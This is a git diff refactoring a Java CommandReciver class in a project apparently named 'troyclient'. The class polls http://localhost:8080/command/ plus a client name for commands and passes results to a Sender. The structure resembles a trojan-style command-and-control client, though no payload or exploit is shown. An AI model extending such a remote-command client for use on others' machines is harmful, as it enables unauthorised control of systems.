@@ -1,5 +1,7 @@
-package ch.lebois.troyclient;
+package ch.lebois.troyclient.functions;
 
+import ch.lebois.troyclient.service.Sender;
+import ch.lebois.troyclient.service.WebHandler;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -10,24 +12,22 @@ import org.slf4j.LoggerFactory;
 public class CommandReciver {
 
     final Logger log = LoggerFactory.getLogger(CommandReciver.class);
+    private String name;
 
-    private String url = "http://localhost:8080/command";
+    private String url = "http://localhost:8080/command/";
     private WebHandler webHandler;
     private Sender sender;
 
-    CommandReciver() {
-        setUrl(url);
-    }
-
-    CommandReciver(String url) {
-        setUrl(url);
+    public CommandReciver(String name) {
+        this.name = name;
+        setUrl(url + name);
     }
 
 
     public void setUrl(String url) {
         this.url = url;
         webHandler = new WebHandler(url);
-        sender = new Sender();
+        sender = new Sender(name);
     }
 
     public void readCommands() {
@@ -63,7 +63,7 @@ public class CommandReciver {
                     e.printStackTrace();
                 }
             }
-        } catch (NullPointerException e) {
+        } catch (NullPointerException | IndexOutOfBoundsException e) {
             //TODO log no Commands
         }
     }
